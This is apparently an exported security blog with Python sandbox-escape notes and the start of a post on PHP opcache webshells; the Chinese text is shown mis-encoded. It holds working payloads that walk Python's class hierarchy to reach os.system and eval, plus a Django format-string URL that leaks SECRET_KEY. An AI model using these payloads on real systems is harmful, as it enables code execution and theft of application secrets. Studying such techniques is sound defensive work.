<p>åœ¨çœ‹åˆ«äººæ–‡ç« æ—¶å‘ç°<strong>mro</strong>å’Œ<strong>bases</strong>ç”¨æ³•ç›¸åŒï¼Œä¸¤è€…å…·ä½“åŒºåˆ«ï¼Œ æš‚æ—¶ç•™ä¸ªå‘ã€‚</p>
<p>ä¸€äº›æƒ…å†µä¸‹ä¹Ÿå¯ç”¨<code>__base__</code>ç›´æ¥è¿”å›å•ä¸ªçš„ç±»</p>
<h2 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">obj = Base()</span><br><span class="line"><span class="keyword">print</span> obj.__class__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">__main__.Base</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<p>è¿”å›ä¸€ä¸ªå®ä¾‹æ‰€å±çš„ç±»</p>
<h2 id="globals"><a href="#globals" class="headerlink" title="globals"></a><strong>globals</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">var = <span class="number">2333</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> test.__init__.__globals__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">&#123;'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__file__': 'backup.py', '__package__': None, 'fun': &lt;function fun at 0x7f542e44b5f0&gt;, 'test': &lt;class __main__.test at 0x7f542e43b598&gt;, 'var': 2333, '__name__': '__main__', 'os': &lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;, '__doc__': None&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ–¹å¼æ˜¯ <code>å‡½æ•°å.__globals__</code>ï¼Œè¿”å›ä¸€ä¸ªå½“å‰ç©ºé—´ä¸‹èƒ½ä½¿ç”¨çš„æ¨¡å—ï¼Œæ–¹æ³•å’Œå˜é‡çš„å­—å…¸ã€‚</p>
<p><a href="https://www.notion.so/61202a69e4ee434099d89b4576fc0ee5">Untitled</a></p>
<h2 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h2><p>è·å–ä¸€ä¸ªç±»çš„å­ç±»ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(Base1)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> Base1.__subclasses__()</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[&lt;class '__main__.test'&gt;]</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h2 id="builtin-amp-amp-builtins"><a href="#builtin-amp-amp-builtins" class="headerlink" title="builtin &amp;&amp; builtins"></a><strong>builtin</strong> &amp;&amp; <strong>builtins</strong></h2><p>pythonä¸­å¯ä»¥ç›´æ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚<code>int(),list()</code>ç­‰ç­‰ã€‚è¿™äº›å‡½æ•°å¯ä»¥åœ¨<code>__builtins__</code>ä¸­å¯ä»¥æŸ¥åˆ°ã€‚æŸ¥çœ‹çš„æ–¹æ³•æ˜¯<code>dir(__builtins__)</code>ã€‚åœ¨æ§åˆ¶å°ä¸­ç›´æ¥è¾“å…¥<code>__builtins__</code>ä¼šçœ‹åˆ°å¦‚ä¸‹æƒ…å†µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python2</span><br><span class="line">&gt;&gt;&gt; __builtins__</span><br><span class="line">&lt;module &#39;__builtin__&#39; (built-in)&gt;</span><br></pre></td></tr></table></figure>

<p><em>psï¼šåœ¨py3ä¸­<code>__builtin__</code>è¢«æ¢æˆäº†<code>builtin</code></em></p>
<p><code>__builtin__</code> å’Œ <code>__builtins__</code>ä¹‹é—´æ˜¯ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ</p>
<p>1ã€åœ¨ä¸»æ¨¡å—<code>main</code>ä¸­ï¼Œ<code>__builtins__</code>æ˜¯å¯¹å†…å»ºæ¨¡å—<code>__builtin__</code>æœ¬èº«çš„å¼•ç”¨ï¼Œå³<code>__builtins__</code>å®Œå…¨ç­‰ä»·äº<code>__builtin__</code>ï¼ŒäºŒè€…å®Œå…¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œä¸åˆ†å½¼æ­¤ã€‚</p>
<p>2ã€éä¸»æ¨¡å—<code>main</code>ä¸­ï¼Œ<code>__builtins__</code>ä»…æ˜¯å¯¹<code>__builtin__.__dict__</code>çš„å¼•ç”¨ï¼Œè€Œé<code>__builtin__</code>æœ¬èº«</p>
<h1 id="ç»§æ‰¿é“¾bypassæ²™ç›’"><a href="#ç»§æ‰¿é“¾bypassæ²™ç›’" class="headerlink" title="ç»§æ‰¿é“¾bypassæ²™ç›’"></a>ç»§æ‰¿é“¾bypassæ²™ç›’</h1><h2 id="ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶"><a href="#ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶" class="headerlink" title="ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶"></a>ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶</h2><p>æ„é€ ç»§æ‰¿é“¾çš„ä¸€ç§æ€è·¯æ˜¯ï¼š</p>
<ol>
<li>éšä¾¿æ‰¾ä¸€ä¸ªå†…ç½®ç±»å¯¹è±¡ç”¨<code>__class__</code>æ‹¿åˆ°ä»–æ‰€å¯¹åº”çš„ç±»</li>
<li>ç”¨<code>__bases__</code>æ‹¿åˆ°åŸºç±»ï¼ˆ<code>&lt;class &#39;object&#39;&gt;</code>ï¼‰</li>
<li>ç”¨<code>__subclasses__()</code>æ‹¿åˆ°å­ç±»åˆ—è¡¨</li>
<li>åœ¨å­ç±»åˆ—è¡¨ä¸­ç›´æ¥å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»</li>
</ol>
<p>ä¸€è¨€æ•ä¹‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åˆ—è¡¨é‡Œé¢æœ‰ä¸€å¨ï¼Œè¿™é‡Œåªçœ‹fileå¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[...,&lt;type &#39;file&#39;&gt;, ...]</span><br></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾<code>file</code>ä½ç½®ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">'file'</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;type &#39;file&#39;&gt;</code>åœ¨ç¬¬40ä½ã€‚<code>().__class__.__bases__[0].__subclasses__()[40]</code></p>
<p>ç”¨<code>dir</code>æ¥çœ‹çœ‹å†…ç½®çš„æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æœ€ç»ˆçš„payloadæ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#39;filename&#39;).readlines()</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨åŒæ ·çš„æ‰‹æ³•å¯ä»¥å¾—åˆ°<code>__mro__</code>å½¢å¼ä¸‹çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__[1].__subclasses__()[40](&#39;filename&#39;).readlines()</span><br></pre></td></tr></table></figure>

<p>è¿™ç§æ–¹æ³•ç­‰ä»·äº</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file(&#39;backup.py&#39;).readlines()</span><br></pre></td></tr></table></figure>

<p><strong>ä½†æ˜¯python3å·²ç»ç§»é™¤äº†fileã€‚æ‰€ä»¥ç¬¬ä¸€ç§æ–¹æ³•åªèƒ½åœ¨py2ä¸­ç”¨ã€‚</strong></p>
<h2 id="ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤"><a href="#ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤" class="headerlink" title="ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤"></a>ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤</h2><p>ç¬¬äºŒç§æ–¹æ³•æ¥ç€ç¬¬ä¸€ç§çš„æ€è·¯æ¥ç€æ¢ç´¢ã€‚ç¬¬ä¸€ç§æ­¢æ­¥äºæŠŠå†…ç½®çš„å¯¹è±¡åˆ—ä¸¾å‡ºæ¥ï¼Œå…¶å®å¯ä»¥ç”¨<code>__globals__</code>æ›´æ·±å…¥çš„å»çœ‹æ¯ä¸ªç±»å¯ä»¥è°ƒç”¨çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬æ¨¡å—ï¼Œç±»ï¼Œå˜é‡ç­‰ç­‰ï¼‰ï¼Œä¸‡ä¸€æœ‰<code>os</code>è¿™ç§ä¸œè¥¿å°±èµšäº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">'os'</span>	<span class="comment">#ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä½ æƒ³åˆ©ç”¨çš„æ¨¡å—</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 72)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 77)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<p><strong>ä¸è¿‡å¾ˆå¯æƒœä¸Šè¿°çš„æ–¹æ³•ä¹Ÿåªèƒ½åœ¨py2ä¸­ä½¿ç”¨ã€‚</strong></p>
<h2 id="ç¬¬ä¸‰ç§"><a href="#ç¬¬ä¸‰ç§" class="headerlink" title="ç¬¬ä¸‰ç§"></a>ç¬¬ä¸‰ç§</h2><p>é‚£æœ‰æ²¡æœ‰é€šåƒpy2å’Œpy3çš„æ–¹æ³•å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œå°±ç”¨ä¸Šé¢<code>__builtins__</code>æ¥æäº‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">'__builtins__'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">&lt;class '_frozen_importlib._ModuleLock'&gt; 64</span></span><br><span class="line"><span class="string">#çœç•¥ä¸€å †</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<p>äºæ˜¯ä¹</p>
<p>py3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure>

<p>py2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure>

<h1 id="ç»§æ‰¿é“¾è¯»djangoé…ç½®ä¿¡æ¯"><a href="#ç»§æ‰¿é“¾è¯»djangoé…ç½®ä¿¡æ¯" class="headerlink" title="ç»§æ‰¿é“¾è¯»djangoé…ç½®ä¿¡æ¯"></a>ç»§æ‰¿é“¾è¯»djangoé…ç½®ä¿¡æ¯</h1><p>på¸ˆå‚…çš„<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html#django">åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²Djangoé…ç½®ä¿¡æ¯</a>ä¸€æ–‡ä¸­ç»™äº†ä¸¤ä¸ªpayloadéƒ½æ˜¯æ— ç™»é™†æƒ…å†µä¸‹è¯»åˆ°djangoé…ç½®ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸Šé¢æ‰€è¿°æ–¹æ³•æ‰¾åˆ°æ›´å¤šçš„payloadã€‚</p>
<p>æµ‹è¯•ä»£ç å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(request)</span>:</span></span><br><span class="line">    template = <span class="string">'Hello &#123;user&#125;, This is your search: '</span> + request.GET.get(<span class="string">'keyword'</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ˜¯æ— ç™»é™†æƒ…å†µï¼Œæ‰€ä»¥requests.Useré‡Œé¢çš„å¯¹è±¡æ˜¯<code>AnonymousUser</code>çš„å®ä¾‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnonymousUser</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="comment">#çœç•¥</span></span><br><span class="line">    _groups = EmptyManager(Group)</span><br><span class="line">    _user_permissions = EmptyManager(Permission)</span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿåˆ°<code>_groups</code>å±æ€§æ˜¯ä¸€ä¸ª<code>EmptyManager</code>å¯¹è±¡ã€‚</p>
<p>è·Ÿè¸ª<code>EmptyManager</code>æ¥åˆ°manger.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##çœç•¥</span></span><br><span class="line"><span class="keyword">from</span> django.db.models.query <span class="keyword">import</span> QuerySet</span><br><span class="line"><span class="comment">##çœç•¥</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmptyManager</span><span class="params">(Manager)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, model)</span>:</span></span><br><span class="line">        super(EmptyManager, self).__init__()</span><br><span class="line">        self.model = model</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_queryset</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> super(EmptyManager, self).get_queryset().none(</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¸ª<code>QuerySet</code>æ¥åˆ°query.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##çœç•¥</span></span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="comment">##çœç•¥</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QuerySet</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Represents a lazy database lookup for a set of objects.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, model=None, query=None, using=None, hints=None)</span>:</span></span><br></pre></td></tr></table></figure>

<p><code>settings</code>é‡Œé¢å°±æ˜¯djangoçš„é…ç½®äº†ã€‚</p>
<p>å°†ä¸Šé¢çš„è·Ÿè¸ªä¸€æ­¥ä¸€æ­¥è½¬æ¢æˆpayloadå°±æ˜¯</p>
<p>æ‹¿åˆ°<code>EmptyManager</code>å¯¹è±¡ï¼š<code>user._groups.__class__</code></p>
<p>æ‹¿åˆ°<code>QuerySet</code>å¯¹è±¡ï¼š<code>user._groups.__class__.__base__.__init__.__globals__[QuerySet]</code></p>
<p>æ‹¿åˆ°SECRET_KEY</p>
<p><code>{user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY}</code></p>
<p>æ‰€ä»¥æœ€åçš„payloadæ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;search?keyword&#x3D;&#123;user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>

<p><img src="pic.png" alt="pic.png"></p>
<p><em>ps:æœ‰ç™»é™†çš„æƒ…å†µä¸‹æ„é€ è¿‡ç¨‹ä¸­ç»§æ‰¿é“¾çš„æ„Ÿè§‰æ›´å¼ºçƒˆï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥è¯•ä¸€ä¸‹~</em></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://www.anquanke.com/post/id/85571">https://www.anquanke.com/post/id/85571</a></p>
<p><a href="http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html">http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>opcacheç¼“å­˜getshell</title>
    <url>/2018/04/08/opcache%E7%BC%93%E5%AD%98getshell/</url>
    <content><![CDATA[<!-- opencacheæ˜¯ä¸€ç§php7è‡ªå¸¦çš„ç¼“å­˜å¼•æ“ï¼Œå®ƒå°†ç¼–è¯‘è¿‡ä¸€éçš„çš„phpè„šæœ¬ä»¥å­—èŠ‚ç æ–‡ä»¶çš„å½¢å¼ç¼“å­˜åœ¨ç‰¹å®šç›®å½•ä¸­ï¼ˆåœ¨php.iniä¸­æŒ‡å®šï¼‰ã€‚è¿™æ ·èŠ‚çœäº†æ¯æ¬¡è®¿é—®åŒä¸€è„šæœ¬éƒ½è¦åŠ è½½å’Œè§£æçš„æ—¶é—´å¼€é”€ã€‚ï¼ˆå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰binæ–‡ä»¶ï¼Œæœ‰å°±ç›´æ¥ç”¨ï¼‰ -->
<!-- more -->

<h2 id="opcacheæ˜¯å•¥"><a href="#opcacheæ˜¯å•¥" class="headerlink" title="opcacheæ˜¯å•¥"></a>opcacheæ˜¯å•¥</h2><p>opencacheæ˜¯ä¸€ç§php7è‡ªå¸¦çš„ç¼“å­˜å¼•æ“ï¼Œå®ƒå°†ç¼–è¯‘è¿‡ä¸€éçš„çš„phpè„šæœ¬ä»¥å­—èŠ‚ç æ–‡ä»¶çš„å½¢å¼ç¼“å­˜åœ¨ç‰¹å®šç›®å½•ä¸­ï¼ˆåœ¨php.iniä¸­æŒ‡å®šï¼‰ã€‚è¿™æ ·èŠ‚çœäº†æ¯æ¬¡è®¿é—®åŒä¸€è„šæœ¬éƒ½è¦åŠ è½½å’Œè§£æçš„æ—¶é—´å¼€é”€ã€‚ï¼ˆå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰binæ–‡ä»¶æœ‰å°±ç›´æ¥ç”¨ï¼‰</p>
<h2 id="åŠ¨æ‰‹é…ç½®"><a href="#åŠ¨æ‰‹é…ç½®" class="headerlink" title="åŠ¨æ‰‹é…ç½®"></a>åŠ¨æ‰‹é…ç½®</h2><p>åœ¨php.iniï¼Œæ‰“å¼€æœ‰å…³opcacheçš„é€‰é¡¹ï¼ˆå³ä¿æŒé»˜è®¤ï¼‰ï¼Œç„¶åä¿®æ”¹ä»¥ä¸‹ä¸¤é¡¹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opcache.file_cache_only &#x3D; 1 #é»˜è®¤æ˜¯0ï¼Œè®¾ç½®ä¸º1åå¼ºåˆ¶æ‰€æœ‰ç¼“å­˜ä»¥æ–‡ä»¶å½¢å¼å­˜åœ¨ï¼Œå¦åˆ™å¯èƒ½ç¼“å­˜å¯èƒ½ä¼šå­˜åœ¨äºå†…å­˜ä¸­</span><br><span class="line">opcache.file_cache &#x3D; &#x2F;tmp&#x2F;cache #é»˜è®¤ä¸ºç©ºï¼Œè¿™ä¸ªç›®å½•phpä¸ä¼šå¸®æˆ‘ä»¬åˆ›å»ºï¼Œä¸€å®šè¦è‡ªå·±æ‰‹åŠ¨åˆ›å»º</span><br></pre></td></tr></table></figure>

<h2 id="ç¼“å­˜è·¯å¾„"><a href="#ç¼“å­˜è·¯å¾„" class="headerlink" title="ç¼“å­˜è·¯å¾„"></a>ç¼“å­˜è·¯å¾„</h2><p>ç®€å•çš„ä¸¾ä¸ªæ —å­ï¼Œæ¯”å¦‚æˆ‘ä»¬è®¿é—®<code>/var/www/html/index.php</code>ï¼Œé‚£ä¹ˆå­—èŠ‚ç¼“å­˜çš„è·¯å¾„æ˜¯<code>/tmp/cache/[system_id]/var/www/html/index.php.bin</code>ã€‚å…¶ä¸­system_idï¼Œç”±php veriosnï¼ŒZend Extension Buildï¼ŒSystemï¼ˆç³»ç»Ÿæ¶æ„ï¼‰ä¸‰éƒ¨åˆ†å†³å®šã€‚è¿™ä¸‰æ ·çš„ä¸œè¥¿éƒ½å¯ä»¥åœ¨phpinfoæ‰¾åˆ°ã€‚å…·ä½“çš„è‡ªåŠ¨åŒ–ç”Ÿæˆè„šæœ¬å¯ä»¥åœ¨<a href="https://github.com/GoSecure/php7-opcache-override/blob/master/system_id_scraper.py">githubçš„è¿™ä¸ªé¡¹ç›®</a>ä¸­æ‰¾åˆ°ã€‚<strong>åœ¨ä¸‹æ–‡ä¸­æŠŠå­—èŠ‚ç æ–‡ä»¶ç®€ç§°é—®binæ–‡ä»¶ï¼ŒæŠŠä¸ä¹‹å¯¹åº”çš„phpæ–‡ä»¶ç®€ç§°ä¸ºæºæ–‡ä»¶ã€‚</strong></p>
<h2 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h2><p>æ­£å¦‚ä¸Šé¢æåˆ°çš„ï¼Œåœ¨opcacheæœºåˆ¶ä¸‹ï¼Œæœ‰binæ–‡ä»¶ä¼šç›´æ¥æ‰§è¡Œbinæ–‡ä»¶ï¼Œé‚£ä¹ˆå¦‚æœé…åˆä¸Šä¼ æ¼æ´è¿™ä¸€ç±»æ¼æ´æ˜¯ä¸æ˜¯è¾¾åˆ°å°†binå†™åˆ°æŒ‡å®šç›®å½•ï¼Œç„¶åè®¿é—®ç›¸åº”çš„phpæ–‡ä»¶è¾¾åˆ°éšè”½getshellçš„ç›®çš„ï¼Ÿ</p>
<h2 id="åˆ©ç”¨çš„é™åˆ¶"><a href="#åˆ©ç”¨çš„é™åˆ¶" class="headerlink" title="åˆ©ç”¨çš„é™åˆ¶"></a>åˆ©ç”¨çš„é™åˆ¶</h2><p>æ ¹æ®å‰é¢çš„æè¿°ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å¦‚ä¸‹çš„é™åˆ¶æ¡ä»¶</p>
<ol>
<li>opcacheè¦æ‰“å¼€(php7è‡ªå¸¦ä½†é»˜è®¤ä¸æ‰“å¼€)</li>
<li>opcache.file_cache_only = 1</li>
<li>çŸ¥é“systemidï¼Œopcacheç¼“å­˜ç›®å½•</li>
<li>ç±»æ–‡ä»¶ä¸Šä¼ æ¼æ´</li>
<li>çŸ¥é“binæ–‡ä»¶æ‰€å¯¹åº”phpçš„æ—¶é—´æˆ³ï¼ˆä¸€ä¸ªç§’çº§æ—¶é—´æˆ³ï¼Œè¿™ç‚¹ç¨åä¼šè§£é‡Šï¼‰</li>
</ol>
<p>å‰ä¸‰ç‚¹å¯ä»¥é€šè¿‡phpinfoç›´æ¥æˆ–è®¡ç®—å¾—çŸ¥ï¼Œé‡ç‚¹è¯´è¯´ç¬¬äº”ç‚¹ï¼Œåœ¨phpinfoä¸­æœ‰ä¸ªå«opcache.validate_timestampsçš„é…ç½®å®ƒé»˜è®¤ä¸º1ï¼Œè¿™åº”è¯¥æ˜¯ä¸ºå®‰å…¨æ€§è€Œè€ƒè™‘çš„ï¼Œåœ¨binæ–‡ä»¶åœ¨åˆ›å»ºæ—¶ä¼šåœ¨æ–‡ä»¶å†…å®¹ä¸­å†™å…¥ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œè¿™ä¸ªæ—¶é—´æˆ³è·Ÿæºæ–‡ä»¶ä¸€æ ·ï¼Œåœ¨æ‰§è¡Œbinæ–‡ä»¶ä¹‹å‰phpä¼šæ£€æŸ¥æ—¶é—´æˆ³æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´åˆ™ä¸¢å¼ƒé‡æ–°åˆ›å»ºbinæ–‡ä»¶ã€‚ä¸ªäººè®¤ä¸ºç¬¬äº”ç‚¹æ˜¯æœ€è‹›åˆ»çš„å› ä¸ºåœ¨cmsé—­æºçš„æƒ…å†µä¸‹å‡ ä¹ä¸å¯çŒœã€‚</p>
